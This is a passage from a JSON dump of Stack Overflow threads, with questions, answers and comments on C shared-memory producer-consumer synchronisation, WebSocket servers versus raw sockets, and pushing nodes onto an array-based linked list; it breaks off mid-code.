<code>SIZE</code> is suspicious.  I do not find a declaration anywhere in the posted code, but you seem to be using it both as the capacity of the buffer and as the overall size of the shared-memory segment.  These are not the same thing."}, {"owner": {"reputation": 3, "user_id": 9329418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27c15929a37d9c964455cd691b2a424b?s=128&d=identicon&r=PG&f=1", "display_name": "Eddy", "link": "https://stackoverflow.com/users/9329418/eddy"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518037100, "post_id": 48671885, "comment_id": 84344551, "body": "@JohnBollinger I accidentally deleted the constant i defined for size which is 1024, but i checked the synchronization of variables, i.e made newBuff-&gt;front = 20 in the producer, then printed that member in consumer and got 20, and it seems as thought it is only for the char buffer-&gt;bytes that is having the issue"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518038278, "post_id": 48671885, "comment_id": 84345181, "body": "@Eddy, that doesn&#39;t change the fact that in your <code>shmget()</code> calls, you are asking only for <code>SIZE</code> bytes of shared memory.  That&#39;s not enough.  It does get rounded up to a multiple of the page size, but you still should be asking for at least as much as you need: <code>sizeof(struct buffer)</code>."}, {"owner": {"reputation": 3, "user_id": 9329418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27c15929a37d9c964455cd691b2a424b?s=128&d=identicon&r=PG&f=1", "display_name": "Eddy", "link": "https://stackoverflow.com/users/9329418/eddy"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1518040482, "post_id": 48671885, "comment_id": 84346237, "body": "@JohnBollinger I changed it to sizeof(newBuff) and the same issue exists."}], "answers": [{"comments": [{"owner": {"reputation": 6143, "user_id": 2147218, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JQVSl.jpg?s=128&g=1", "display_name": "bazza", "link": "https://stackoverflow.com/users/2147218/bazza"}, "edited": false, "score": 0, "creation_date": 1518044597, "post_id": 48674094, "comment_id": 84348009, "body": "All excellent points. Worth adding a mention of memory fences too, for good measure"}, {"owner": {"reputation": 3, "user_id": 9329418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27c15929a37d9c964455cd691b2a424b?s=128&d=identicon&r=PG&f=1", "display_name": "Eddy", "link": "https://stackoverflow.com/users/9329418/eddy"}, "edited": false, "score": 0, "creation_date": 1518149810, "post_id": 48674094, "comment_id": 84395950, "body": "Thank you for taking the time to help me with my issue. As for the issues addressed not in bold, they were mostly addressed and fixed. The points made in old however were truly the issues that fixed my code. It appears my professor gave me the wrong algorithm to change the rear index so that was the reason I was not receiving the proper output in my consumer.c I will post the finished code after i tackle the final issue of swapping every other byte in the output file."}], "tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 0, "last_activity_date": 1518100409, "last_edit_date": 1518100409, "creation_date": 1518041322, "answer_id": 48674094, "question_id": 48671885, "link": "https://stackoverflow.com/questions/48671885/accessing-a-shared-memory-buffer-in-another-process/48674094#48674094", "title": "Accessing a shared memory buffer in another process", "body": "<p>There are several difficulties with your code, some already addressed in comments:</p>\n\n<ul>\n<li><p><code>ftok()</code> requires the path passed to it to designate an existing file, but the path you are passing does not.</p></li>\n<li><p>You request less shared memory than you actually need: only the size of the buffer content, not of a whole <code>struct buffer</code>.  Because the amount of shared memory actually allocated will be rounded up to a multiple of the page size, this may end up being ok, but you should <em>ensure</em> that it will be ok by requesting the amount you actually need.</p></li>\n<li><p>System V shared memory segments have kernel persistence, so once created, they will continue to exist until they are explicitly removed or the system is rebooted.  You never remove yours.  You also initialize its contents only when you first create it.  Unless you manually delete it between runs, therefore, you'll use old data -- with the end-of-file indicator set, for instance -- on the second and subsequent runs.  I suggest having the consumer schedule it for removal.</p></li>\n<li><p>The consumer prints only one byte of data from the buffer, and it does so <em>before</em> verifying that there is anything to read.</p></li>\n<li><p><strong>After adding a byte to the buffer, the producer does not update the available byte count until <em>after</em> signaling the consumer.</strong>  At best, this is wasteful, because the consumer will not see the change in count until the next time (if any) it wakes.</p></li>\n<li><p><strong>The producer updates the <code>rear</code> index of the buffer incorrectly, based on the current <em><code>front</code></em> value instead of on the current <code>rear</code> value.  The data will therefore not be written into the correct places in the buffer array.</strong></p></li>\n<li><p><strong>Once the producer sets the endOfFile flag, the consumer ignores all but one of any remaining unread bytes.</strong></p></li>\n<li><p><strong>If the producer leaves the <code>count</code> zero when it finishes, the consumer will deadlock.</strong></p></li>\n</ul>\n\n<p>I find that modified versions of your programs addressing all of these issues successfully and accurately communicate data through shared memory.</p>\n\n<p><strong>Update:</strong></p>\n\n<p>Also,</p>\n\n<ul>\n<li>The way in which consumer and / or producer initializes the mutex and condition variable is not itself safe.  It is possible for whichever process attempts the <code>shmget()</code> second (or third, or ...) to access those objects before the first finishes initializing them.  More generally, once a shared memory segment is attached, there is no inherent memory barrier involved in writing to it.  To address these issues, the natural companion to SysV shared memory is SysV semaphores.</li>\n</ul>\n"}], "owner": {"reputation": 3, "user_id": 9329418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/27c15929a37d9c964455cd691b2a424b?s=128&d=identicon&r=PG&f=1", "display_name": "Eddy", "link": "https://stackoverflow.com/users/9329418/eddy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1261, "favorite_count": 0, "accepted_answer_id": 48674094, "answer_count": 1, "score": 0, "last_activity_date": 1518100409, "creation_date": 1518032041, "last_edit_date": 1518042919, "question_id": 48671885, "link": "https://stackoverflow.com/questions/48671885/accessing-a-shared-memory-buffer-in-another-process", "title": "Accessing a shared memory buffer in another process", "body": "<p>I am trying to solve the producer consumer problem using mutexes and a shared buffer, but am having trouble accessing values in my shared buffer struct, specifically the char array. When I invoke the producer.c file in one terminal and print the values (the input is a txt file of the alphabet) using </p>\n\n<pre><code>printf(\"%c\", newBuff-&gt;bytes[newBuff-&gt;rear]); \n</code></pre>\n\n<p>the chars do appear as normal, however when I do the same thing in consumer.c, but with </p>\n\n<pre><code>printf(\"%c\", newBuff-&gt;bytes[newBuff-&gt;front]);\n</code></pre>\n\n<p>the values appear blank. The newBuff->front value is zero, so it should print the letter a. When I access other values in my struct in consumer.c like front, count, or rear they are correct. Share memory creation as well as attachment also works properly so I believe the issue is either I am not storing the char values properly in the array or I am trying to access them incorrectly. In the code below I placed the printf in the loop for producer.c and then outside the loop for consumer.c so I know for a fact a value is present before the consumer starts extracting data.</p>\n\n<p><strong>Consumer.c</strong></p>\n\n<pre><code>typedef struct buffer{\n    pthread_mutex_t lock;\n    pthread_cond_t shout;\n    int front;\n    int rear;\n    int count;\n    int endOfFile;\n    char bytes[1024];\n} buffer;\n\n\nint main(int argc, char const *argv[]) {\n    int i=0;\n    FILE *file = fopen(argv[1], \"w\");\n    if (argc != 2){\n        printf(\"You must enter in a file name\\n\");\n    }\n    int shmid, swapCount=0;\n    char swapBytes[] = \"\";\n    char path[] = \"~\";\n    key_t key = ftok(path, 7);\n    buffer* newBuff;\n    if ((shmid = shmget(key, SIZE, 0666 | IPC_CREAT | IPC_EXCL)) != -1) {\n        newBuff = (buffer*) shmat(shmid, 0, 0);\n        printf(\"successful creation\\n\");\n        newBuff-&gt;front = 0;\n        newBuff-&gt;count = 0;\n        newBuff-&gt;endOfFile = 0;\n        pthread_mutexattr_t attr;\n        pthread_condattr_t condAttr;\n\n        pthread_mutexattr_init(&amp;attr);\n        pthread_mutexattr_setpshared(&amp;attr, PTHREAD_PROCESS_SHARED);\n        pthread_mutex_init(&amp;newBuff-&gt;lock, &amp;attr);\n\n        pthread_condattr_init(&amp;condAttr);\n        pthread_condattr_setpshared(&amp;condAttr, PTHREAD_PROCESS_SHARED);\n        pthread_cond_init(&amp;newBuff-&gt;shout, &amp;condAttr);\n    } //shared memory creation\n\n    else if ((shmid = shmget(key, 0, 0)) != -1){\n        printf(\"%d\\n\", shmid);\n        printf(\"successful attachment\\n\" );\n        newBuff = (buffer*) shmat(shmid, 0, 0);\n        printf(\"%c\\n\", newBuff-&gt;count);\n    }\n    else{\n        printf(\"oops\\n\");\n        exit(0);\n    }\n    pthread_mutex_lock(&amp;newBuff-&gt;lock);\n    printf(\"%c\\n\", newBuff-&gt;bytes[newBuff-&gt;front]);\n    while (newBuff-&gt;endOfFile != 1)\n    {\n        while (newBuff-&gt;count == 0){\n            pthread_cond_signal(&amp;newBuff-&gt;shout);\n            pthread_cond_wait(&amp;newBuff-&gt;shout, &amp;newBuff-&gt;lock);\n        }\n        newBuff-&gt;front = ((newBuff-&gt;front + 1)%SIZE);\n        newBuff-&gt;count--;\n    }\n    pthread_mutex_unlock(&amp;newBuff-&gt;lock);\n    shmdt(&amp;newBuff);\n\n    //pthread_mutexattr_destroy(&amp;attr);\n    //pthread_condattr_destroy(&amp;condAttr);*/\n\n    return 0;\n}\n</code></pre>\n\n<p><strong>Producer.c</strong></p>\n\n<pre><code>typedef struct buffer{\n    pthread_mutex_t lock;\n    pthread_cond_t shout;\n    int front;\n    int rear;\n    int count;\n    int endOfFile;\n    char bytes[1024];\n} buffer;\n\n\nint main(int argc, char const *argv[]) {\n    FILE *file = fopen(argv[1], \"r\");\n    if (argc != 2){\n        printf(\"You must enter in a file dumbass\\n\");\n    }\n    int shmid;\n    char path[] = \"~\";\n    key_t key = ftok(path, 7);\n    buffer* newBuff;\n    printf(\"dfasdfasdf\\n\");\n    if ((shmid = shmget(key, SIZE, 0666 | IPC_CREAT | IPC_EXCL)) != -1) {\n        newBuff = (buffer*) shmat(shmid, 0, 0);\n        printf(\"successful creation\\n\");\n\n\n        newBuff-&gt;front = 0;\n        newBuff-&gt;count = 0;\n        newBuff-&gt;endOfFile=0;\n        pthread_mutexattr_t attr;\n        pthread_condattr_t condAttr;\n\n        pthread_mutexattr_init(&amp;attr);\n        pthread_mutexattr_setpshared(&amp;attr, PTHREAD_PROCESS_SHARED);\n        pthread_mutex_init(&amp;newBuff-&gt;lock, &amp;attr);\n\n        pthread_condattr_init(&amp;condAttr);\n        pthread_condattr_setpshared(&amp;condAttr, PTHREAD_PROCESS_SHARED);\n        pthread_cond_init(&amp;newBuff-&gt;shout, &amp;condAttr);\n    } //shared memory creation\n\n    else if ((shmid = shmget(key, 0, 0)) != -1){\n        printf(\"successful attachment\\n\" );\n        newBuff = (buffer*) shmat(shmid, 0, 0);\n    }\n    else{\n        printf(\"oops\\n\");\n        exit(0);\n    }\n    printf(\"%d\\n\", shmid);\n    pthread_mutex_lock(&amp;newBuff-&gt;lock);\n    while (fscanf(file, \"%c\", &amp;newBuff-&gt;bytes[newBuff-&gt;rear]) != EOF) //read in file\n    {\n        printf(\"%c\\n\", newBuff-&gt;bytes[newBuff-&gt;rear]);\n        while (newBuff-&gt;count &gt;= SIZE){ //buffer is full\n            //(\"%c\\n\", newBuff-&gt;bytes[newBuff-&gt;rear]);\n            pthread_cond_signal(&amp;newBuff-&gt;shout);\n            pthread_cond_wait(&amp;newBuff-&gt;shout, &amp;newBuff-&gt;lock);\n        }\n        //printf(\"%c\\n\", newBuff-&gt;bytes[newBuff-&gt;rear]);\n        newBuff-&gt;rear = ((newBuff-&gt;front + 1)%SIZE);\n        newBuff-&gt;count++;\n    }\n    newBuff-&gt;endOfFile = 1;\n    pthread_cond_signal(&amp;newBuff-&gt;shout);\n    pthread_mutex_unlock(&amp;newBuff-&gt;lock);\n\n    shmdt(&amp;newBuff);\n\n    //pthread_mutexattr_destroy(&amp;attr);\n    //pthread_condattr_destroy(&amp;condAttr);\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["javascript", "c", "nginx", "websocket", "server"], "comments": [{"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1518039100, "post_id": 48671628, "comment_id": 84345609, "body": "In this case what&#39;s the motivation behind using pure C? Node.js can use FFI to load in C libraries if you need to use C for a portion of your code."}, {"owner": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1518046045, "post_id": 48671628, "comment_id": 84348552, "body": "@tadman that&#39;s what he wants to use. Why question it?"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "reply_to_user": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "edited": false, "score": 0, "creation_date": 1518046098, "post_id": 48671628, "comment_id": 84348574, "body": "@MustacheMoses There&#39;s an absurd number of Websocket-type servers for Node.js, you can throw a rock and hit six, but very few for C, that&#39;s why. I mention that because in the question having a JavaScript server is mentioned, so a partial conversion would be easier if that&#39;s the case."}, {"owner": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1518046162, "post_id": 48671628, "comment_id": 84348588, "body": "@tadman Yes, I&#39;ve had experience with the overabundance of websocket servers for node. The OP probably wanted to use C for performance."}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "reply_to_user": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "edited": false, "score": 0, "creation_date": 1518046196, "post_id": 48671628, "comment_id": 84348602, "body": "@MustacheMoses That&#39;s why FFI + a C library is pretty nice. You get all the C you want, but you&#39;re not stuck using it for every single thing, even when it&#39;s not a good fit."}, {"owner": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1518046241, "post_id": 48671628, "comment_id": 84348615, "body": "@tadman makes sense."}, {"owner": {"reputation": 16402, "user_id": 4025095, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/blJ4L.jpg?s=128&g=1", "display_name": "Myst", "link": "https://stackoverflow.com/users/4025095/myst"}, "reply_to_user": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 0, "creation_date": 1518056574, "post_id": 48671628, "comment_id": 84351299, "body": "@tadman - the inverse is also true. It&#39;s quite easy to add JavaScript bindings (or Ruby, or PHP or...) to any C application you&#39;re writing - making it easy to extend any C application using scripting languages. I admit that the V8 JavaScript bindings require C++ (brrr...), but it&#39;s not that hard to bridge the gap."}], "answers": [{"comments": [{"owner": {"reputation": 263, "user_id": 2814715, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c61103a49d9cdffba48d6e034a35955b?s=128&d=identicon&r=PG&f=1", "display_name": "wuampa", "link": "https://stackoverflow.com/users/2814715/wuampa"}, "edited": false, "score": 0, "creation_date": 1518081581, "post_id": 48671957, "comment_id": 84360557, "body": "Thank you all for the clarification and the solution."}], "tags": [], "owner": {"reputation": 513, "user_id": 8293226, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ccfWx.png?s=128&g=1", "display_name": "mustachioed", "link": "https://stackoverflow.com/users/8293226/mustachioed"}, "is_accepted": true, "score": 6, "last_activity_date": 1518039745, "last_edit_date": 1518039745, "creation_date": 1518032319, "answer_id": 48671957, "question_id": 48671628, "link": "https://stackoverflow.com/questions/48671628/problems-with-websocket-server-in-c/48671957#48671957", "title": "Problems With Websocket Server in C", "body": "<p>Your problem is that there's a very marked difference between <em>websockets</em> and sockets. Sockets are more low level network interfaces whereas websockets run on a web server of some kind.</p>\n\n<p>I would recommend using a <em>websocket</em> library for C. :) <a href=\"https://libwebsockets.org/\" rel=\"noreferrer\">Here's</a> one I found after doing a quick google search. The documentation for said library can be found <a href=\"https://libwebsockets.org/lws-api-doc-master/html/index.html\" rel=\"noreferrer\">here</a> as well.</p>\n"}, {"tags": [], "owner": {"reputation": 16402, "user_id": 4025095, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/blJ4L.jpg?s=128&g=1", "display_name": "Myst", "link": "https://stackoverflow.com/users/4025095/myst"}, "is_accepted": false, "score": 5, "last_activity_date": 1521380335, "last_edit_date": 1521380335, "creation_date": 1518056396, "answer_id": 48676446, "question_id": 48671628, "link": "https://stackoverflow.com/questions/48671628/problems-with-websocket-server-in-c/48676446#48676446", "title": "Problems With Websocket Server in C", "body": "<p>The answer given by @MustacheMoses is very much to the point (I upvoted) - there's a huge difference between sockets and Websockets.</p>\n\n<p><strong>Websockets</strong> is a protocol that starts with an HTTP \"upgrade\" request and continues with a multiplexed message exchange protocol using a specific data packaging scheme.</p>\n\n<p><strong>Sockets</strong> refer to the lower level communication channels (i.e., Stream Sockets, such as TCP/IP sockets or Unix Sockets, or even Raw Sockets).</p>\n\n<p>I would also point out that, much like node.js, websocket libraries / servers in C come in different flavors.</p>\n\n<p><strong>Some libraries provide an almost Web Framework approach (for example, <a href=\"https://kore.io\" rel=\"nofollow noreferrer\">kore.io</a> or my own <a href=\"http://facil.io\" rel=\"nofollow noreferrer\">facil.io micro-framework</a>) and others are more narrow in scope</strong>.</p>\n\n<p>Much like node.js packages / servers (which are often written in C or C++), they all differ in performance and features (I would test this before I commit to a specific approach).</p>\n\n<p>As @tadman rightfully pointed out, <strong>it might be better to stick with your existing code base and add any C libraries you need using FFI</strong>.</p>\n\n<p>It's somewhat rare for high level services, such as web applications, to be authored using a lower level language.</p>\n\n<p>The inverse is also true, it's often less desirable to author the lower level web server using a higher level language.</p>\n\n<p>This is just my humble opinion, but consider that I'm writing this even though I'm the author of a websocket application framework written in C. When the time comes to write an actual production Websocket app, I often prefer to use facil.io as a Ruby C extension and write the app in Ruby (unless Ruby isn't available).</p>\n"}], "owner": {"reputation": 263, "user_id": 2814715, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/c61103a49d9cdffba48d6e034a35955b?s=128&d=identicon&r=PG&f=1", "display_name": "wuampa", "link": "https://stackoverflow.com/users/2814715/wuampa"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4125, "favorite_count": 0, "accepted_answer_id": 48671957, "answer_count": 2, "score": 2, "last_activity_date": 1521380335, "creation_date": 1518030891, "last_edit_date": 1518038824, "question_id": 48671628, "link": "https://stackoverflow.com/questions/48671628/problems-with-websocket-server-in-c", "title": "Problems With Websocket Server in C", "body": "<p>I need to use NGINX as a WebSocket Proxy, and I've been able to run this <a href=\"https://www.nginx.com/blog/websocket-nginx/\" rel=\"nofollow noreferrer\">tutorial</a> without any problem. In this case, a simple WebSocket application is done using ws and Node.js. However, I need to substitute the code in javascript (server.js) with an application developed in C. </p>\n\n<p>To do so, I've tried with the last example shown in this <a href=\"http://www.binarytides.com/socket-programming-c-linux-tutorial/\" rel=\"nofollow noreferrer\">tutorial</a>, which is very simple and easy to understand. </p>\n\n<p>However, using the same port and configuration as in server.js, when running the compiled C code, it seems that the communication is not properly established. In this case, when I run wscat in the client's terminal, it seems it is waiting for something since the word 'connected' is never seen, but the communication is not finished either (this is why I say it seems it is waiting for something; in other cases, if I try with a different port, for instance, the communication is closed and it appears a sentence as 'error: unexpected server response'). </p>\n\n<p>On the other hand, on the server side, I can see there is a new connection. I suspect that the answer from the server is not arriving at the client, but I don't know why. Nginx is properly configured since the example done in javascript works properly, and I'm using the same ports in both javascript and C (in server.js I have: 'wss = new WebSocketServer({port: 8010});' and in server.c: 'server.sin_port = htons( 8010 );'    from my point of view it should work...)</p>\n\n<p>I've tried with other examples in C with a similar behavior. Does anyone know which may be the cause for this? Do you recommend other particular C codes for WebSocket servers?</p>\n"}, {"tags": ["c", "linked-list", "double-pointer"], "comments": [{"owner": {"user_type": "does_not_exist", "display_name": "user9237024"}, "reply_to_user": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "edited": false, "score": 0, "creation_date": 1518031943, "post_id": 48671564, "comment_id": 84341806, "body": "oh it was just for testing."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1518039817, "post_id": 48671564, "comment_id": 84345928, "body": "Where is <code>node</code> in <code>node_t *newhead = &amp;node;</code> declared and where is its storage located?"}], "answers": [{"comments": [{"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518046574, "post_id": 48674577, "comment_id": 84348742, "body": "Nice answer. For a project at my university I had to code a micro kernel from the start, because of time constrains I could not implement <code>malloc</code>, so I had to to something similar. However I used double-linked lists and two pointers, one pointing to the free memory and one to the used one. This reminded me of that implementation. Sadly it&#39;s been so long, that I&#39;ve forgotten the details, but I know it gave me headaches and many sleepless nights."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518048749, "post_id": 48674577, "comment_id": 84349344, "body": "@Pable Yes, these are fun. chux posted a static linked list once that used recursion to fill it if I recall correctly -- it was a bit of pointer poetry. I&#39;ll see if I can ferret out the link."}, {"owner": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518048874, "post_id": 48674577, "comment_id": 84349379, "body": "Yeah, even though it was hard to get it correct, it was a lot of fun. I&#39;d like to see that chux&#39;s version."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "reply_to_user": {"reputation": 12179, "user_id": 1480131, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/WZPm4.jpg?s=128&g=1", "display_name": "Pablo", "link": "https://stackoverflow.com/users/1480131/pablo"}, "edited": false, "score": 0, "creation_date": 1518051838, "post_id": 48674577, "comment_id": 84350197, "body": "Well I have looked though my thousands of files and I can&#39;t seem to find the one I was looking for. Probably because the question wasn&#39;t directly about the array of struct used as a list. Maybe if @chux strolls by he can recall the context."}], "tags": [], "owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "is_accepted": false, "score": 1, "last_activity_date": 1518043812, "last_edit_date": 1518043812, "creation_date": 1518043505, "answer_id": 48674577, "question_id": 48671564, "link": "https://stackoverflow.com/questions/48671564/pushing-item-to-a-linked-list-c/48674577#48674577", "title": "Pushing item to a linked list (C)", "body": "<p>Your immediate problem is there is no declaration for <code>node</code> prior to:</p>\n\n<pre><code>node_t *newhead = &amp;node;\n</code></pre>\n\n<p>You are taking the address of something that doesn't exist -- that's never a good idea (and invokes <em>Undefined Behavior</em> and generally a SegFault).</p>\n\n<p>There is no need for <code>nodes</code> to be declared <em>globally</em> and no need for <code>blocked</code> at all (based on your current code). Avoid using global variables. Declare your variables in <code>main()</code> and pass the variables (or a pointer) to any functions as required.</p>\n\n<p>If you are using an array of type <code>node_t</code> as a linked list without allocation, and are then looking to <code>\"push\"</code> (e.g. add a new node_t at the beginning as the new list address) then you are essentially just needing to have you <code>newnode.next</code> point to your <code>nodes</code> array (as the address of an array is simply a pointer to its first member) and you need <code>array[0].prev</code> to point to the address of <code>newnode</code>.</p>\n\n<p>From what I can glean from your question, the purpose for the code is an exercise in pointer understanding. Regardless of whether you are dealing with a list stored on the stack or one allocated globally, if you change the first-node in the list, you are changing the list address (because the start of the list is the address of the first node) In order to change the list address within a function, you must pass the <em>address of</em> the list as a parameter to the function --or-- you return a pointer to the new first node and assign address to your list pointer back in the caller. (both are shown below)</p>\n\n<p>Since you are wanting to <code>\"push\"</code> a locally declared node to the head of the list, in like manner, you must pass the <em>address of</em> that node to your push function so it is working with the actual address of that node rather than the address of the copy of the node created if the node itself is passed as a parameter to your push function. You can do this with something similar to the following to handle addressing your array of nodes as a list through a new node pushed to the head of the list:</p>\n\n<pre><code>/* push takes address of array and address of node as parameters */\nnode_t *push (node_t **arr, node_t *node)\n{\n    node-&gt;next = *arr;              /* next for new node is list address */\n    (*arr)[0].prev = node;          /* prev for list is new node address */\n    *arr = node;                    /* new node address is new list address */\n\n    return node;                    /* return pointer to new 1st node */\n}\n</code></pre>\n\n<p>Above you are simply setting <code>newnode-&gt;next</code> to the current list address, then setting the <code>list-&gt;prev</code> to point to the new node, and then setting the list address as the address of the <code>newnode</code> (a pointer to that address is also returned which can be assigned back in the caller, as needed).</p>\n\n<p>The remainder of the changes were really just clean-ups to what you had, adding parameters to your functions as required so that <code>nodes</code> can be properly declared in <code>main()</code> and adding a <code>prn</code> function to print the list. Also node there are no <em>magic numbers</em> used in the code. If you need a constant <code>#define</code> one (or more), or use a global <code>enum</code> to define them (that is a valid use of a global).</p>\n\n<p>Putting it altogether, you could do something like the following:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\n#define LMAX 10         /* if you need a constant, define one */\n\ntypedef struct node {\n    int val;\n    struct node *prev, *next;\n} node_t;\n\nvoid init (node_t *nodes)\n{\n    for (int i = 0; i &lt; LMAX; i++){\n        nodes[i].val = i;\n        if (i == 0)\n            nodes[i].prev = NULL;\n        else {\n            nodes[i-1].next = &amp;nodes[i];\n            nodes[i].prev = &amp;nodes[i-1];\n        }\n    }\n}\n\n/* push takes address of array and address of node as parameters */\nnode_t *push (node_t **arr, node_t *node)\n{\n    node-&gt;next = *arr;              /* next for new node is list address */\n    (*arr)[0].prev = node;          /* prev for list is new node address */\n    *arr = node;                    /* new node address is new list address */\n\n    return node;                    /* return pointer to new 1st node 